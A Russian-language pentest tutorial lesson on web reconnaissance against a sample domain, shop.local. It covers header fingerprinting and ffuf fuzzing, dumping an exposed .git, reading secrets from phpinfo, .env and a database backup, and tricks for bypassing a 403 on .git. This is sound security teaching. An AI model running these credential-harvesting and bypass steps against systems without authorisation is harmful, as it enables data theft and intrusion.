## Задача

Мы уже знаем (из `web-architecture`), что приложение — это слои: браузер, веб-сервер, приложение, база. Но знание схемы бесполезно, пока не умеешь **находить то, что сервер отдаёт наружу**, и замечать его **ошибки конфигурации**. Это фундамент всей ветви: сначала карта, потом уязвимости.

Разберём один домен и покажем, как за пять минут увидеть его поверхность и первые мисконфиги.

## Наш пример: домен shop.local

У нас есть цель `shop.local`. Никаких учётных данных, только домен. Начинаем с самого дешёвого — одного запроса к корню и чтения заголовков.

```bash
$ curl -sI https://shop.local/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=8f2a...; path=/
Content-Type: text/html; charset=UTF-8
```

Заголовок `Server` — это «визитка» веб-сервера, `X-Powered-By` — бэкенд-язык. Мы узнали стек: **nginx + PHP 7.4** (эта версия PHP давно без поддержки — зацепка). `PHPSESSID` подтверждает, что сессии ведёт PHP.

## Шаг 1: поверхность — что вообще существует

Корень отдаёт главную. Но приложение почти никогда не состоит из одной страницы. Ищем скрытые пути перебором словаря:

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
       -u https://shop.local/FUZZ -mc 200,301,302,401,403 -t 40
.git/HEAD               [Status: 200, Size: 23]
backup                  [Status: 301, Size: 178]
phpinfo.php             [Status: 200, Size: 94021]
server-status           [Status: 403, Size: 153]
```

Что мы прочли: `ffuf` подставляет каждое слово из словаря вместо `FUZZ` и оставляет только «интересные» коды (`-mc`). Три находки уже важны:

- `.git/HEAD` вернул `200` — значит, на сервере лежит **рабочая копия git-репозитория**, и, возможно, весь исходный код.
- `phpinfo.php` — страница с полной конфигурацией PHP.
- `server-status` — 403 (запрещено), но сам путь существует.

## Шаг 2: разбираем мисконфиг — экспонированный `.git`

Файл `.git/HEAD` — служебный: в нём лежит ссылка на текущую ветку репозитория. Если сервер отдаёт его, отдаёт и всё остальное. Скачиваем каталог `.git` целиком и восстанавливаем исходники:

```bash
$ curl -s https://shop.local/.git/HEAD
ref: refs/heads/main

$ git-dumper https://shop.local/.git/ ./shop-src
[-] Downloading .git
[+] Downloaded 214 files
[+] Source code dumped to ./shop-src

$ ls shop-src
config.php  db.php  index.php  upload.php
```

Мы получили **исходный код приложения** — включая `config.php` и `db.php`, где почти всегда лежат креды к базе. Это уже не «ошибка конфигурации», а прямая утечка секретов.

> **Мисконфиг** (misconfiguration) — неверная настройка сервера, при которой наружу уходит то, что должно быть закрыто: листинги каталогов, `.git`, `.env`, статус-страницы. Это отдельный класс находок: код может быть идеальным, а сервер — дырявым.

## Шаг 3: `phpinfo` и `server-status` — что утекает

`phpinfo.php` — легальная функция PHP, но на проде её быть не должно: она раскрывает пути, переменные окружения, модули и версии.

```bash
$ curl -s https://shop.local/phpinfo.php | grep -E 'DOCUMENT_ROOT|APP_KEY'
DOCUMENT_ROOT  /var/www/shop/public
APP_KEY        base64:8fJ2k...
```

Мы узнали абсолютный путь приложения (`/var/www/shop/public` — пригодится для LFI) и, что важнее, `APP_KEY` — секрет фреймворка, которым подписывают куки и токены.

`server-status` закрыт (403), но это Apache-модуль. На nginx аналог — `stub_status`; проверим:

```bash
$ curl -s https://shop.local/nginx_status
Active connections: 12
server accepts handled requests
 1842 1842 5031
```

Если `nginx_status` открыт всем — наружу уходит внутренняя метрика трафика. Не критично, но это признак «сервер настраивали на скорость, а не на безопасность».

## Шаг 4: сводим к архитектуре

Теперь вернёмся к схеме слоёв и наложим находки:

| Слой | Что мы нашли | Тип |
|------|--------------|-----|
| Веб-сервер (nginx) | `nginx_status`, версия 1.18.0 | мисконфиг |
| Приложение (PHP 7.4) | `.git`, `phpinfo.php`, `APP_KEY` | мисконфиг + утечка |
| Код | `config.php`, `db.php` | исходники |
| Данные | креды БД (в `db.php`) | следующий шаг |

Это и есть «базовый фундамент»: прежде чем искать SQL-инъекцию, ты уже знаешь, где лежит код, как называется база и каким ключом подписаны токены.

## Шаг 5: листинг каталогов и `.env`

Мисконфиг бывает не только в путях, но и в поведении сервера. Включённый **листинг каталогов** (autoindex) превращает папку в список файлов:

```bash
$ curl -s https://shop.local/backup/
<html><head><title>Index of /backup</title></head>
<a href="db_2024-01.sql">db_2024-01.sql</a>
<a href="shop.tar.gz">shop.tar.gz</a>
```

`/backup` вернул список — значит, там лежит дамп базы `db_2024-01.sql`. Скачиваем и получаем все хеши паролей. Это уже не «ошибка приложения», а чистая настройка сервера.

Рядом проверяем то, что должно быть в `.env`, но часто остаётся в вебе:

```bash
$ curl -s https://shop.local/.env
APP_ENV=production
DB_HOST=127.0.0.1
DB_USER=shop
DB_PASS=Sup3rS3cret
```

`DB_PASS` в открытом виде — прямой путь к базе. Итого фундамент даёт три независимых утечки: исходники (`.git`), конфиг (`phpinfo`/`.env`) и данные (`.sql`).

## Если не сработало

- **`.git` отдаёт 403** — попробуй обходы: `.git/HEAD` с `?`, `/.git%2FHEAD`, заглавные буквы. Иногда фильтр настроен на точный путь.
- **`ffuf` даёт одни 200** — сервер отдаёт «мягкие 404». Фильтруй по размеру: `-fs 1234`, а не по коду.
- **`phpinfo` нет** — проверь `info.php`, `test.php`, `php.php`, `debug.php`.
- **Нет домена, только IP** — задай `Host` вручную: `curl -H 'Host: shop.local' http://10.0.0.5/`.

## Что мы теперь знаем

- Начинаем с карты: заголовки, версии, скрытые пути — это дёшево и сразу даёт стек.
- Мисконфиг сервера — самостоятельный класс уязвимостей, не требующий взлома кода.
- `.git`, `phpinfo.php`, `.env` — три классические утечки, которые ищут в первую очередь.
- Найденный `APP_KEY` и креды БД — топливо для следующих уроков.

## Частые вопросы

**Зачем вообще смотреть заголовки, если можно сразу фаззить?** Заголовки бесплатны и сразу дают стек и версии. Это определяет, **какие** проверки вообще имеют смысл.

**Мисконфиг сервера — это уязвимость?** Да, самостоятельный класс: открытый `.git`, `.env`, листинг каталогов, `phpinfo`. Код может быть идеальным, а сервер — дырявым.

**Что опаснее — найденный `.env` или SQLi?** `.env` часто даёт креды БД напрямую, то есть сравним с SQLi по влиянию. А `.git` отдаёт весь исходник.

**Как понять, что путь существует, но закрыт?** Код `403` (а не `404`) означает, что ресурс есть, но доступ запрещён. Это зацепка: ищи обход.

**С чего начинать на незнакомом сайте?** Один `curl -I` на корень → стек; затем `ffuf` по `common.txt` → поверхность; затем проверка `.git`/`.env`.

**Это шумно?** Один запрос и фаззинг словарём — умеренно. Согласуй активную разведку в scope, но она ожидаема на пентесте.

## Ещё один сценарий: robots.txt как карта

Иногда мисконфиг прячется в «легальных» файлах. Читаем `robots.txt`:

```bash
$ curl -s https://shop.local/robots.txt
User-agent: *
Disallow: /admin-panel/
Disallow: /api/internal/
Sitemap: https://shop.local/sitemap.xml
```

`robots.txt` — файл для поисковых роботов, но `Disallow` — это **список того, что владелец хочет спрятать**. Часто там и лежат интересные пути. Проверяем `sitemap.xml`:

```bash
$ curl -s https://shop.local/sitemap.xml | grep -oE '<loc>[^<]+' | head
<loc>https://shop.local/admin-panel/users
<loc>https://shop.local/api/internal/debug
```

Теперь у нас есть два «спрятанных» пути — бесплатно и без фаззинга.

## На что смотреть дальше

- **Коды 403 vs 404.** `403` = ресурс есть, но закрыт — это цель для обхода; `404` = нет.
- **Заголовки и версии.** `Server`, `X-Powered-By`, cookie фреймворка — кандидаты на CVE.
- **Файлы-утечки.** `.git`, `.env`, `.svn`, `backup/`, `*.sql`, `*.bak` — проверяй в первую очередь.
- **Листинги.** Включённый autoindex превращает папку в список файлов.
- **Дубли контента.** Один и тот же сайт на разных портах/поддоменах может быть настроен слабее.
- **Ошибки.** Отдай неверный параметр — стек-трейс выдаст пути и версии.
